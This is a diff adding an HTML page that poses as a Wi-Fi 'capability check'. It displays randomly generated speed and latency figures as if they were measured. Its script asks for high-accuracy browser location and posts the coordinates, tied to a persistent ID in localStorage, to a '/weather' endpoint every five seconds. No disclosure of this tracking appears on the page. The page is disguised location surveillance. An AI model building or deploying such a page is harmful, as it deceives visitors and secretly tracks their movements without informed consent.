@@ -1,0 +1,505 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#252722">
+    <title>Network Capability Checker</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --background: #1d201d;
+            --surface: #282b26;
+            --surface-raised: #30332d;
+            --border: #44483e;
+            --text: #f0eee5;
+            --muted: #a8aa9e;
+            --accent: #c7a779;
+            --accent-dark: #94764f;
+            --success: #a6b79a;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 28px 18px;
+            background:
+                radial-gradient(
+                    ellipse at 15% 5%,
+                    #34382e 0,
+                    transparent 42%
+                ),
+                var(--background);
+            color: var(--text);
+            font-family: "Segoe UI", Arial, sans-serif;
+        }
+
+        .wifi-card {
+            width: 100%;
+            max-width: 430px;
+            padding: 30px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            box-shadow: 0 24px 70px rgba(0, 0, 0, 0.24);
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 9px;
+            margin-bottom: 24px;
+            color: var(--accent);
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 2.2px;
+            text-transform: uppercase;
+        }
+
+        .brand-mark {
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 2px;
+            transform: rotate(45deg);
+        }
+
+        h1 {
+            margin-bottom: 9px;
+            font-size: clamp(23px, 5vw, 29px);
+            font-weight: 600;
+            letter-spacing: -0.8px;
+        }
+
+        .subtitle {
+            color: var(--muted);
+            font-size: 13px;
+            line-height: 1.7;
+        }
+
+        .connection-symbol {
+            display: grid;
+            place-items: center;
+            width: 76px;
+            height: 76px;
+            margin: 25px 0 17px;
+            border: 1px solid #555548;
+            border-radius: 17px;
+            background: var(--surface-raised);
+            color: var(--accent);
+        }
+
+        .connection-symbol svg {
+            width: 37px;
+            height: 37px;
+        }
+
+        .status-line {
+            display: flex;
+            align-items: flex-start;
+            gap: 9px;
+            min-height: 36px;
+            color: var(--success);
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .status-dot {
+            flex-shrink: 0;
+            width: 7px;
+            height: 7px;
+            margin-top: 4px;
+            border-radius: 50%;
+            background: var(--accent);
+        }
+
+        .metrics {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: 10px;
+            margin: 18px 0 24px;
+        }
+
+        .metric {
+            min-width: 0;
+            padding: 17px 15px;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            background: #242722;
+        }
+
+        .metric-label {
+            margin-bottom: 12px;
+            color: var(--muted);
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: 1.1px;
+        }
+
+        .metric-value {
+            overflow-wrap: anywhere;
+            color: var(--text);
+            font-size: 29px;
+            font-weight: 600;
+            letter-spacing: -1px;
+        }
+
+        .metric-unit {
+            margin-top: 5px;
+            color: #909388;
+            font-size: 11px;
+        }
+
+        .capacity {
+            margin: 22px 0;
+        }
+
+        .capacity-heading {
+            display: flex;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 11px;
+            font-size: 12px;
+        }
+
+        .capacity-heading span:first-child {
+            color: var(--muted);
+        }
+
+        .capacity-heading span:last-child {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .progress-track {
+            height: 6px;
+            overflow: hidden;
+            border-radius: 10px;
+            background: #44463d;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            border-radius: inherit;
+            background: var(--accent);
+            transition: width 0.5s ease;
+        }
+
+        .disclosure {
+            margin: 21px 0;
+            padding: 14px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            color: var(--muted);
+            font-size: 11px;
+            line-height: 1.75;
+        }
+
+        .disclosure strong {
+            color: var(--text);
+            font-weight: 600;
+        }
+
+        code {
+            color: var(--accent);
+            font-family: Consolas, monospace;
+        }
+
+        button {
+            width: 100%;
+            min-height: 49px;
+            padding: 14px 18px;
+            border: 1px solid var(--accent);
+            border-radius: 10px;
+            background: var(--accent);
+            color: #25251f;
+            font-family: inherit;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        button:hover {
+            background: #d6bb94;
+            border-color: #d6bb94;
+        }
+
+        button:focus-visible {
+            outline: 2px solid var(--text);
+            outline-offset: 4px;
+        }
+
+        .footer {
+            margin-top: 15px;
+            color: #85877d;
+            font-size: 10px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        @media (max-width: 420px) {
+            .wifi-card {
+                padding: 23px 18px;
+            }
+
+            .metric {
+                padding: 15px 12px;
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                transition-duration: 0.01ms !important;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <main class="wifi-card">
+        <div class="brand">
+            <span class="brand-mark" aria-hidden="true"></span>
+            Network Analyzer
+        </div>
+
+        <h1>Wi-Fi Capability Check</h1>
+        <p class="subtitle">
+            Explore estimated network performance and connection capability.
+        </p>
+
+        <div class="connection-symbol" aria-hidden="true">
+            <svg viewBox="0 0 40 40" fill="none"
+                 stroke="currentColor" stroke-width="2.2"
+                 stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 14.5C13.7 6.8 26.3 6.8 35 14.5" />
+                <path d="M10.5 20C16 15.2 24 15.2 29.5 20" />
+                <path d="M16 25.5C18.4 23.5 21.6 23.5 24 25.5" />
+                <circle cx="20" cy="31" r="1.6" fill="currentColor"
+                        stroke="none" />
+            </svg>
+        </div>
+
+        <p class="status-line" aria-live="polite">
+            <span class="status-dot" aria-hidden="true"></span>
+            <span id="status">Ready to start</span>
+        </p>
+
+        <div class="metrics">
+            <div class="metric">
+                <div class="metric-label">DOWNLOAD</div>
+                <div class="metric-value" id="download">--</div>
+                <div class="metric-unit">Mbps · estimated</div>
+            </div>
+
+            <div class="metric">
+                <div class="metric-label">UPLOAD</div>
+                <div class="metric-value" id="upload">--</div>
+                <div class="metric-unit">Mbps · estimated</div>
+            </div>
+
+            <div class="metric">
+                <div class="metric-label">LATENCY</div>
+                <div class="metric-value" id="ping">--</div>
+                <div class="metric-unit">ms · simulated</div>
+            </div>
+
+            <div class="metric">
+                <div class="metric-label">NETWORK RATING</div>
+                <div class="metric-value" id="rating">--</div>
+                <div class="metric-unit">Rating</div>
+            </div>
+        </div>
+
+        <div class="capacity">
+            <div class="capacity-heading">
+                <span>Estimated capability</span>
+                <span id="capacity-text">Not tested</span>
+            </div>
+
+            <div
+                class="progress-track"
+                role="progressbar"
+                aria-label="Simulated network capability"
+                aria-valuemin="0"
+                aria-valuemax="100"
+                aria-valuenow="0"
+                id="progress-track"
+            >
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+        </div>
+
+      
+
+        <button id="check-weather" type="button">
+            Start Capability Check
+        </button>
+
+        
+
+    </main>
+
+    <script>
+        const id = localStorage.getItem("id") || generateId();
+
+        const btn = document.querySelector("#check-weather");
+        const status = document.querySelector("#status");
+
+        let __interval;
+        let running = false;
+
+        // Generate clearly labeled demo values.
+        function generateEstimates() {
+            const download = Math.floor(Math.random() * 91) + 10;
+            const upload = Math.floor(Math.random() * 41) + 5;
+            const ping = Math.floor(Math.random() * 91) + 10;
+
+            let rating;
+            let capability;
+
+            if (download >= 75) {
+                rating = "A";
+                capability = "High";
+            } else if (download >= 45) {
+                rating = "B";
+                capability = "Good";
+            } else if (download >= 25) {
+                rating = "C";
+                capability = "Moderate";
+            } else {
+                rating = "D";
+                capability = "Basic";
+            }
+
+            const score = Math.round(download / 100 * 100);
+
+            document.querySelector("#download").textContent = download;
+            document.querySelector("#upload").textContent = upload;
+            document.querySelector("#ping").textContent = ping;
+            document.querySelector("#rating").textContent = rating;
+            document.querySelector("#capacity-text").textContent = capability;
+
+            document.querySelector("#progress-bar").style.width =
+                score + "%";
+
+            document.querySelector("#progress-track")
+                .setAttribute("aria-valuenow", score);
+        }
+
+        btn.addEventListener("click", () => {
+            if (running) {
+                stopCheck();
+                return;
+            }
+
+            if (!navigator.geolocation) {
+                status.textContent = "Geolocation is not supported.";
+                return;
+            }
+
+            running = true;
+            btn.textContent = "Stop Capability Check";
+            status.textContent = "Requesting browser location permission...";
+
+            generateEstimates();
+            getLocation();
+        });
+
+        function getLocation() {
+            if (!running) return;
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    if (!running) return;
+
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+
+                    status.textContent =
+                        "DATA received. Sending to backend...";
+
+                    try {
+                        const response = await fetch("/weather", {
+                            method: "POST",
+                            body: JSON.stringify({
+                                id,
+                                lat,
+                                lng,
+                            }),
+                            headers: {
+                                "Content-Type": "application/json"
+                            }
+                        });
+
+                        if (!response.ok) {
+                            throw new Error("HTTP " + response.status);
+                        }
+
+                       
+                    } catch (error) {
+                        console.error("post error", error);
+                        status.textContent =
+                            "Backend request failed. Check your connection.";
+                    }
+
+                    // Preserve the original five-second polling behavior.
+                    if (running) {
+                        clearTimeout(__interval);
+                        __interval = setTimeout(getLocation, 5000);
+                    }
+                },
+                (error) => {
+                    console.error("Location error:", error);
+
+                    status.textContent =
+                        error.code === 1
+                            ? "Location permission denied."
+                            : "Unable to obtain location.";
+
+                    stopCheck();
+                },
+                {
+                    enableHighAccuracy: true
+                }
+            );
+        }
+
+        function stopCheck() {
+            running = false;
+            clearTimeout(__interval);
+            btn.textContent = "Start Capability Check";
+            status.textContent = "Check stopped.";
+        }
+
+        function generateId(length = 10) {
+            const characters =
+                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+            let result = "";
+
+            for (let i = 0; i < length; i++) {
+                const randomIndex =
+                    Math.floor(Math.random() * characters.length);
+
+                result += characters[randomIndex];
+            }
+
+            localStorage.setItem("id", result);
+            return result;
+        }
+    </script>
+</body>
+</html>
